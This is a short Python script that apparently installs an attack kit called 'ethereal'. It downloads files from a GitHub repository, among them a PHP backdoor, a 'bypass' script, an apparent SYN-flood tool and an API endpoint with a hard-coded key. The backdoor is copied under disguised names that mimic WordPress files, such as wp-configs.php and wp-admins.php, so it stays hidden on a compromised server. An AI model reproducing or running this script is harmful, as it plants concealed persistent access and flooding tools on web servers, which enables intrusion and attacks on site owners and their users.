# import requests
import os
import sys

if sys.version_info[0] < 3:
    from urllib import urlretrieve
else:
    from urllib.request import urlretrieve

cwd = os.getcwd()
files = ['syn.pl', 'api.php', 'test.php',
         'bypass.pl', 'version.txt', 'index.html', 'http.pl', 'watch.php', 'backdoor.php']

for file in files:
    if os.path.isfile(file):
        os.remove(file)
    url = 'https://raw.githubusercontent.com/xIvan0ff/ethereal-installer/main/' + file
    files_to_save_as = [file]
    if file == "backdoor.php":
        files_to_save_as = ["install.php", "uninstall.php",
                            "backup.php", "wp-configs.php", "wp-admins.php"]
    for _file in files_to_save_as:
        urlretrieve(url, _file)
        with open(_file, 'r') as file_object:
            filedata = file_object.read()
            filedata = filedata.replace("REPLACEME", cwd)
        with open(_file, 'w') as file_object:
            file_object.write(filedata)

print("Installing done...")
print(cwd + "/api.php key: etherealhehe")
